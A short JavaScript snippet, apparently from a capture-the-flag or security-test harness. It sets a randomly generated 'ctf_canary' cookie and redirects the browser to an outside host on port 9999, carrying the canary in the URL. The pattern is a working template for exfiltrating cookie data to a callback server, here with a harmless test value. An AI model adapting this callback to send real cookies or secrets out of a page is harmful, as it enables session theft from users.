const canary = crypto.randomUUID();
document.cookie = `ctf_canary=${encodeURIComponent(canary)}; Path=/; SameSite=Lax`;

const callback = new URL("http://manifold.crim.ist:9999/");
callback.searchParams.set("ctf_canary", canary);
location.href = callback;
